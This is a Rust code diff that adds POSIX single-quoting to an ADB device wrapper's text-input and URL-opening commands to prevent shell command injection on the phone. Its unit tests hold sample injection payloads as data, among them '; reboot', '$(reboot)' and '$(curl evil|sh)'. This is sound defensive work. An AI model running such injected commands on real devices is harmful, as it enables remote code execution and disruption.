@@ -4,6 +4,22 @@
 
 use std::process::Command;
 
+/// POSIX single-quote a string for safe inclusion in a device-side shell
+/// command line.
+///
+/// `adb shell <arg1> <arg2> ...` joins its trailing arguments with spaces
+/// and executes them via the device's on-device shell (`/system/bin/sh`) --
+/// unlike a local `std::process::Command`, which passes argv entries
+/// directly with no shell involved, ADB's remote execution model means any
+/// shell metacharacter (`;`, `` ` ``, `$()`, `&`, `|`, ...) in a
+/// caller-supplied value like a URL or text string IS interpreted by the
+/// phone's shell. Wrapping the value in single quotes (escaping any
+/// embedded `'` as `'\''`) makes the device shell treat it as one opaque
+/// token regardless of its contents.
+fn shell_quote(s: &str) -> String {
+    format!("'{}'", s.replace('\'', r"'\''"))
+}
+
 /// ADB command executor for a specific device.
 pub struct AdbDevice {
     serial: String,
@@ -120,10 +136,17 @@ impl AdbDevice {
 
     /// Type text.
     pub fn input_text(&self, text: &str) -> Result<(), String> {
-        // Replace spaces with %s for adb
-        let escaped = text.replace(' ', "%s");
+        // Android's `input text` command uses %s as its own placeholder for
+        // a literal space (spaces would otherwise split the argument at the
+        // `input text` level); this is unrelated to shell quoting.
+        let android_escaped = text.replace(' ', "%s");
+        // Shell-quote on top of that: `adb shell` passes its trailing args
+        // through the device's shell, so metacharacters in `text` (e.g.
+        // from an LLM-generated task description) must not be interpretable
+        // there. See `shell_quote` docs.
+        let quoted = shell_quote(&android_escaped);
         let status = Command::new("adb")
-            .args(["-s", &self.serial, "shell", "input", "text", &escaped])
+            .args(["-s", &self.serial, "shell", "input", "text", &quoted])
             .status()
             .map_err(|e| format!("adb text failed: {e}"))?;
         if status.success() {
@@ -161,6 +184,11 @@ impl AdbDevice {
 
     /// Open a URL in the default browser.
     pub fn open_url(&self, url: &str) -> Result<(), String> {
+        // See `shell_quote` docs: `adb shell` passes trailing args through
+        // the device's shell, so a URL containing shell metacharacters
+        // (e.g. from a task description like "open youtube and search
+        // <query>") must be quoted before reaching it.
+        let quoted = shell_quote(url);
         let status = Command::new("adb")
             .args([
                 "-s",
@@ -171,7 +199,7 @@ impl AdbDevice {
                 "-a",
                 "android.intent.action.VIEW",
                 "-d",
-                url,
+                &quoted,
             ])
             .status()
             .map_err(|e| format!("adb open_url failed: {e}"))?;
@@ -228,5 +256,39 @@ mod tests {
     fn test_adb_device_construction() {
         let dev = AdbDevice::new("test_serial");
         assert_eq!(dev.serial, "test_serial");
+    }
+
+    #[test]
+    fn shell_quote_wraps_plain_value() {
+        assert_eq!(shell_quote("hello"), "'hello'");
+    }
+
+    #[test]
+    fn shell_quote_neutralizes_command_separator() {
+        let malicious = "; reboot";
+        let quoted = shell_quote(malicious);
+        // The whole thing must be one single-quoted token -- no unescaped
+        // `;` outside the quotes that a shell could split on.
+        assert_eq!(quoted, "'; reboot'");
+        assert!(quoted.starts_with('\''));
+        assert!(quoted.ends_with('\''));
+    }
+
+    #[test]
+    fn shell_quote_neutralizes_command_substitution() {
+        for malicious in ["`reboot`", "$(reboot)", "$(curl evil|sh)"] {
+            let quoted = shell_quote(malicious);
+            assert_eq!(quoted, format!("'{malicious}'"));
+        }
+    }
+
+    #[test]
+    fn shell_quote_escapes_embedded_single_quote() {
+        // A naive `'{}'` wrap would let an embedded `'` close the quoted
+        // string early and re-open shell interpretation. Each embedded `'`
+        // must become `'\''` (close-quote, literal quote, re-open-quote).
+        let malicious = "x'; reboot; echo '";
+        let quoted = shell_quote(malicious);
+        assert_eq!(quoted, r"'x'\''; reboot; echo '\'''");
     }
 }
